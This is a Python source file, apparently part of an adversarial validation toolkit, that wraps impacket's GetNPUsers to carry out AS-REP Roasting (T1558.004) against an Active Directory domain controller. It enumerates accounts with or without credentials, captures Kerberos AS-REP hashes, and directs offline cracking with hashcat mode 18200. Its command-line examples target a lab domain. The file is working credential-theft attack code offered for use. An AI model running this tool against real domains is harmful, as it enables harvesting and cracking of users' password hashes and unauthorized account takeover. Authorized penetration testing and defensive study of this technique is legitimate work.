import re
import subprocess
import time

TOOL_BINARY = "impacket-GetNPUsers"   # apt: impacket-GetNPUsers  pip: GetNPUsers.py

TECHNIQUE_ID   = "T1558.004"
TECHNIQUE_NAME = "AS-REP Roasting"


def run_asrep_roast(
    domain,
    username=None,
    password=None,
    dc_ip=None,
    hashes=None,
    users_file=None,
    timeout=120,
):
    """
    Run AS-REP Roasting.

    Args:
        domain:     Target domain, e.g. "lab.local"
        username:   Valid domain user for Mode 1 (None for Mode 2 no-creds)
        password:   Plaintext password (Mode 1 only)
        dc_ip:      Domain controller IP
        hashes:     "LMhash:NThash" for PtH (Mode 1 only)
        users_file: Path to newline-separated username list (Mode 2)
        timeout:    Subprocess hard timeout in seconds

    Returns:
        Standard AEV schema dict.
    """
    start = time.monotonic()

    # Build the target string — impacket format differs by mode
    if username and (password or hashes):
        # Mode 1: authenticated enumeration
        target = f"{domain}/{username}"
        if password and not hashes:
            target += f":{password}"
        cmd = [TOOL_BINARY, target, "-request"]
        if hashes:
            cmd += ["-hashes", hashes]
    else:
        # Mode 2: unauthenticated spray from user list
        if not users_file:
            return _error(
                "mode 2 requires users_file — provide a path to a username list",
                duration=time.monotonic() - start,
            )
        target = f"{domain}/"
        cmd = [TOOL_BINARY, target, "-usersfile", users_file, "-no-pass"]

    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as e:
        return _error(
            f"timed out after {timeout}s",
            stderr=e.stderr or "",
            duration=time.monotonic() - start,
        )
    except FileNotFoundError:
        return _error(
            f"{TOOL_BINARY!r} not found on PATH. "
            "Install: apt install python3-impacket  OR  pip install impacket",
            duration=time.monotonic() - start,
        )

    try:
        parsed = _parse(result.stdout, result.stderr, result.returncode)

        if parsed["auth_failed"]:
            return _error(
                "authentication failed — check credentials",
                stderr=result.stderr,
                duration=time.monotonic() - start,
            )

        return {
            "technique_id": TECHNIQUE_ID,
            "technique_name": TECHNIQUE_NAME,
            "tool": "asrep_roast",
            "status": "success",
            "summary": _summary(parsed),
            "data": parsed,
            "error": None,
            "raw_stderr_tail": None,
            "duration_seconds": round(time.monotonic() - start, 2),
        }
    except Exception as e:
        return _error(
            f"unexpected parse error: {e}",
            stderr=result.stderr,
            duration=time.monotonic() - start,
        )


# ─── Internal helpers ──────────────────────────────────────────────────────────

def _parse(stdout, stderr, returncode):
    
    vulnerable_users = []  # users confirmed as no-preauth
    hashes = []
    rejected_users = []    # users that exist but have preauth enabled
    nonexistent_users = []

    for line in stdout.splitlines():
        stripped = line.strip()

        # Hash lines — the prize
        if stripped.startswith("$krb5asrep$"):
            # Format: $krb5asrep$23$username@DOMAIN:hash
            m = re.match(r"\$krb5asrep\$\d+\$([^@]+)@", stripped)
            username = m.group(1) if m else "unknown"
            hashes.append({
                "account": username,
                "hash": stripped,
                "hashcat_mode": 18200,
            })

        # [-] lines — per-user status, NOT global errors
        elif stripped.startswith("[-]"):
            if "UF_DONT_REQUIRE_PREAUTH" in stripped:
                # User exists but preauth IS enabled (the normal case)
                m = re.search(r"\[\-\]\s+User\s+(\S+)\s+doesn", stripped)
                if m:
                    rejected_users.append(m.group(1))
            elif "doesn't exist" in stripped.lower():
                m = re.search(r"\[\-\]\s+User\s+(\S+)\s+doesn", stripped)
                if m:
                    nonexistent_users.append(m.group(1))

        # [+] lines sometimes appear for confirmed no-preauth users
        elif stripped.startswith("[+]"):
            m = re.search(r"\[\+\]\s+([^\s]+)\s+is\s+vulnerable", stripped, re.IGNORECASE)
            if m:
                vulnerable_users.append(m.group(1))

    # Distill vulnerable users from hash lines if not caught above
    for h in hashes:
        name = h["account"]
        if name not in vulnerable_users:
            vulnerable_users.append(name)

    # Auth failure: a GLOBAL failure, distinct from per-user [-] messages
    auth_failed = any(
        sig in (stderr or "").lower()
        for sig in [
            "status_logon_failure",
            "kdc_err_preauth_failed",
            "invalid credentials",
            "wrong password",
        ]
    )

    return {
        "vulnerable_user_count": len(vulnerable_users),
        "vulnerable_users": vulnerable_users,
        "hash_count": len(hashes),
        "hashes": hashes,
        "rejected_user_count": len(rejected_users),
        "nonexistent_user_count": len(nonexistent_users),
        "auth_failed": auth_failed,
        "exit_code": returncode,
    }


def _summary(p):
    if p["hash_count"] == 0:
        return (
            f"AS-REP Roasting: no vulnerable accounts found. "
            f"{p['rejected_user_count']} user(s) checked, all have pre-authentication enabled."
        )
    names = ", ".join(p["vulnerable_users"])
    return (
        f"AS-REP Roast successful: {p['hash_count']} hash(es) captured "
        f"for account(s): {names}. "
        f"Run hashcat mode 18200 to crack offline."
    )


def _error(reason, stdout="", stderr="", duration=None):
    return {
        "technique_id": TECHNIQUE_ID,
        "technique_name": TECHNIQUE_NAME,
        "tool": "asrep_roast",
        "status": "timeout" if "timed out" in reason else "error",
        "summary": f"AS-REP Roasting failed: {reason}",
        "data": None,
        "error": reason,
        "raw_stderr_tail": (stderr or "")[-500:] or None,
        "duration_seconds": round(duration, 2) if duration is not None else None,
    }


# ─── Terminal smoke-test ───────────────────────────────────────────────────────
# Mode 1: python3 asrep_roast.py lab.local 10.0.0.5 -u normaluser -p Password123
# Mode 2: python3 asrep_roast.py lab.local 10.0.0.5 --usersfile /tmp/users.txt

if __name__ == "__main__":
    import argparse, json

    ap = argparse.ArgumentParser(
        description="AS-REP Roast wrapper — manual test harness",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Mode 1 — with creds (auto-enumerate all no-preauth users):
  python3 asrep_roast.py lab.local 10.0.0.5 -u normaluser -p Password123

  # Mode 2 — no creds, username list:
  echo -e 'asrepvuln\\nAdministrator\\nfakeuser' > /tmp/users.txt
  python3 asrep_roast.py lab.local 10.0.0.5 --usersfile /tmp/users.txt

  # Test auth failure:
  python3 asrep_roast.py lab.local 10.0.0.5 -u normaluser -p WRONG
        """,
    )
    ap.add_argument("domain", help="Target domain")
    ap.add_argument("dc_ip",  help="Domain controller IP")
    ap.add_argument("-u", "--username",  default=None)
    ap.add_argument("-p", "--password",  default=None)
    ap.add_argument("--hashes",          default=None, help="LMhash:NThash")
    ap.add_argument("--usersfile",       default=None, help="Path to username list (Mode 2)")
    ap.add_argument("--timeout", type=int, default=120)
    args = ap.parse_args()

    result = run_asrep_roast(
        domain=args.domain,
        username=args.username,
        password=args.password,
        dc_ip=args.dc_ip,
        hashes=args.hashes,
        users_file=args.usersfile,
        timeout=args.timeout,
    )
    print(json.dumps(result, indent=2))